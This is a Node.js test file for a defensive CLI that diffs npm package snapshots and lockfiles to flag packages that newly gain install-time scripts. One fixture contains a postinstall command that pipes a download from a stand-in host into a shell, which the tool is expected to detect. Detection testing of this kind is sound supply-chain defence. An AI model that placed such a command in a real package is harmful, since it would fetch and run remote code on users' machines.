import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { run, buildSnapshot } from "./cli.mjs";

test("run: --help prints usage and exits 0", async () => {
  const { exitCode, output } = await run(["--help"]);
  assert.equal(exitCode, 0);
  assert.match(output, /Usage:/);
});

test("run: no subcommand exits 1", async () => {
  const { exitCode } = await run([]);
  assert.equal(exitCode, 1);
});

test("run: unknown subcommand exits 2", async () => {
  const { exitCode, output } = await run(["bogus"]);
  assert.equal(exitCode, 2);
  assert.match(output, /Unknown subcommand/);
});

test("run: diff exits 0 when nothing gained a script", async () => {
  const files = {
    "baseline.json": JSON.stringify([{ name: "x", version: "1.0.0", hasInstallScript: false }]),
    "current.json": JSON.stringify([{ name: "x", version: "1.1.0", hasInstallScript: false }]),
  };
  const { exitCode, output } = await run(["diff", "baseline.json", "current.json"], {
    readFile: (p) => files[p],
  });
  assert.equal(exitCode, 0);
  assert.match(output, /No new install-time scripts/);
});

test("run: diff exits 1 and names the package that gained a script", async () => {
  const files = {
    "baseline.json": JSON.stringify([{ name: "node-sass-like", version: "1.5.0", hasInstallScript: false }]),
    "current.json": JSON.stringify([{ name: "node-sass-like", version: "1.6.0", scripts: { postinstall: "curl https://x.example/p.sh | sh" } }]),
  };
  const { exitCode, output } = await run(["diff", "baseline.json", "current.json"], {
    readFile: (p) => files[p],
  });
  assert.equal(exitCode, 1);
  assert.match(output, /GAINED SCRIPT\s+node-sass-like/);
  assert.match(output, /pipes-a-download-to-a-shell/);
});

test("run: diff exits 0 when a script is merely modified, not gained", async () => {
  const files = {
    "baseline.json": JSON.stringify([{ name: "x", version: "1.0.0", scripts: { postinstall: "node build.js" } }]),
    "current.json": JSON.stringify([{ name: "x", version: "1.0.1", scripts: { postinstall: "node build.js --extra" } }]),
  };
  const { exitCode, output } = await run(["diff", "baseline.json", "current.json"], {
    readFile: (p) => files[p],
  });
  assert.equal(exitCode, 0);
  assert.match(output, /CHANGED SCRIPT\s+x/);
});

test("run: diff --json emits a parseable report", async () => {
  const files = {
    "b.json": JSON.stringify([{ name: "x", version: "1.0.0", hasInstallScript: false }]),
    "c.json": JSON.stringify([{ name: "x", version: "1.0.0", hasInstallScript: true }]),
  };
  const { exitCode, output } = await run(["diff", "b.json", "c.json", "--json"], { readFile: (p) => files[p] });
  assert.equal(exitCode, 1);
  const parsed = JSON.parse(output);
  assert.equal(parsed.changed.length, 1);
  assert.equal(parsed.changed[0].kind, "gained");
});

test("run: diff --ignore suppresses a specific package from the exit code", async () => {
  const files = {
    "b.json": JSON.stringify([{ name: "accepted", version: "1.0.0", hasInstallScript: false }]),
    "c.json": JSON.stringify([{ name: "accepted", version: "2.0.0", hasInstallScript: true }]),
  };
  const { exitCode } = await run(["diff", "b.json", "c.json", "--ignore", "accepted"], { readFile: (p) => files[p] });
  assert.equal(exitCode, 0);
});

test("run: diff with a missing file exits 2", async () => {
  const { exitCode, output } = await run(["diff", "missing.json", "also-missing.json"], {
    readFile: async () => {
      throw new Error("ENOENT: no such file");
    },
  });
  assert.equal(exitCode, 2);
  assert.match(output, /Error:/);
});

test("run: diff with no files exits 2 with a usage message", async () => {
  const { exitCode, output } = await run(["diff"]);
  assert.equal(exitCode, 2);
  assert.match(output, /Usage: node cli\.mjs diff/);
});

test("run: lockfile lists packages that run a script right now", async () => {
  const lockfile = JSON.stringify({
    packages: {
      "": { name: "app" },
      "node_modules/left-pad": { version: "1.3.0" },
      "node_modules/node-sass": { version: "9.0.0", hasInstallScript: true },
    },
  });
  const { exitCode, output } = await run(["lockfile", "package-lock.json"], {
    readFile: async () => lockfile,
  });
  assert.equal(exitCode, 0);
  assert.match(output, /1 of 2 package\(s\) run a script/);
  assert.match(output, /node-sass/);
  assert.doesNotMatch(output, /left-pad/);
});

test("run: lockfile --json emits the scripted subset only", async () => {
  const lockfile = JSON.stringify({
    packages: {
      "node_modules/left-pad": { version: "1.3.0" },
      "node_modules/node-sass": { version: "9.0.0", hasInstallScript: true },
    },
  });
  const { exitCode, output } = await run(["lockfile", "package-lock.json", "--json"], {
    readFile: async () => lockfile,
  });
  assert.equal(exitCode, 0);
  const parsed = JSON.parse(output);
  assert.equal(parsed.length, 1);
  assert.equal(parsed[0].name, "node-sass");
});

test("run: lockfile with no path exits 2 with a usage message", async () => {
  const { exitCode, output } = await run(["lockfile"]);
  assert.equal(exitCode, 2);
  assert.match(output, /Usage: node cli\.mjs lockfile/);
});

test("run: lockfile surfaces a parse error as exit 2", async () => {
  const { exitCode, output } = await run(["lockfile", "package-lock.json"], {
    readFile: async () => "not json",
  });
  assert.equal(exitCode, 2);
  assert.match(output, /Error:/);
});

test("run: snapshot writes JSON via an injected scanner", async () => {
  const writes = {};
  const { exitCode, output } = await run(["snapshot", "--out", "out.json"], {
    scan: async () => [{ name: "x", version: "1.0.0", scripts: {} }],
    writeFile: async (p, content) => {
      writes[p] = content;
    },
  });
  assert.equal(exitCode, 0);
  assert.match(output, /Wrote 1 package/);
  assert.match(writes["out.json"], /"name": "x"/);
});

test("run: snapshot with no --out prints JSON to stdout", async () => {
  const { exitCode, output } = await run(["snapshot"], {
    scan: async () => [{ name: "x", version: "1.0.0", scripts: {} }],
  });
  assert.equal(exitCode, 0);
  const parsed = JSON.parse(output);
  assert.deepEqual(parsed, [{ name: "x", version: "1.0.0", scripts: {} }]);
});

test("run: snapshot surfaces a scan error as exit 2", async () => {
  const { exitCode, output } = await run(["snapshot"], {
    scan: async () => {
      throw new Error("cannot read node_modules: ENOENT");
    },
  });
  assert.equal(exitCode, 2);
  assert.match(output, /Error:/);
});

// buildSnapshot itself, against a real temp directory -- exercises the
// top-level + one-level-into-@scope node_modules walk with no injection.
test("buildSnapshot: reads plain and scoped package.json lifecycle scripts from a real directory", async () => {
  const dir = await fs.mkdtemp(path.join(os.tmpdir(), "npm-lifecycle-script-check-"));
  try {
    await fs.mkdir(path.join(dir, "left-pad"));
    await fs.writeFile(
      path.join(dir, "left-pad", "package.json"),
      JSON.stringify({ name: "left-pad", version: "1.3.0" }),
    );
    await fs.mkdir(path.join(dir, "node-sass"));
    await fs.writeFile(
      path.join(dir, "node-sass", "package.json"),
      JSON.stringify({ name: "node-sass", version: "9.0.0", scripts: { postinstall: "node scripts/build.js", test: "mocha" } }),
    );
    await fs.mkdir(path.join(dir, "@scope", "widget"), { recursive: true });
    await fs.writeFile(
      path.join(dir, "@scope", "widget", "package.json"),
      JSON.stringify({ name: "@scope/widget", version: "2.0.0", scripts: { preinstall: "echo hi" } }),
    );
    // A directory with no package.json is skipped, not fatal.
    await fs.mkdir(path.join(dir, ".bin"));

    const snapshot = await buildSnapshot(dir);
    assert.deepEqual(snapshot, [
      { name: "@scope/widget", version: "2.0.0", scripts: { preinstall: "echo hi" } },
      { name: "left-pad", version: "1.3.0", scripts: {} },
      { name: "node-sass", version: "9.0.0", scripts: { postinstall: "node scripts/build.js" } },
    ]);
  } finally {
    await fs.rm(dir, { recursive: true, force: true });
  }
});

test("buildSnapshot: a missing directory raises a clear error", async () => {
  await assert.rejects(() => buildSnapshot("/does/not/exist/at/all"), /cannot read/);
});
